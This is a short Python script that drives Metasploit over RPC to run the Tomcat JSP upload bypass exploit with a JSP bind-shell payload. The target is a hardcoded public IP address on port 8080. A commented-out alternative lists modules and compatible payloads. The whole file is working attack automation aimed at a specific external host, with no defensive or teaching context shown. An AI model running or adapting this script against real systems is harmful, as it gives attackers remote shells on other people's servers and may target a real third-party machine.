
from metasploit.msfrpc import MsfRpcClient
def launch_attack(profile):
  client = MsfRpcClient('abc123')
  exploit = client.modules.use('exploit', profile["exploit"])
  exploit['RHOST'] = profile['RHOST']
  exploit['RPORT'] = profile['RPORT']
  exploit['VERBOSE'] = True
  ret = exploit.execute(payload=profile["payload"])
  print ret

"""
import msfrpc
def launch_attack(profile):
  client = msfrpc.Msfrpc({"host":profile["mp_host"]})
  client.login('msf','abc123')
  modules = client.call('module.exploits')
  mod = [m for m in modules['modules'] if profile["exploit"] in m]
  print mod
  ret = client.call('module.compatible_payloads', mod)
  print ret
"""

if __name__ == "__main__":
  profile = {
    'mp_host' : '127.0.0.1',
    'exploit' : 'multi/http/tomcat_jsp_upload_bypass',
    'RHOST'   : '104.42.10.62',
    'RPORT'   : '8080',
    "payload" : "java/jsp_shell_bind_tcp",
  }
  launch_attack(profile)
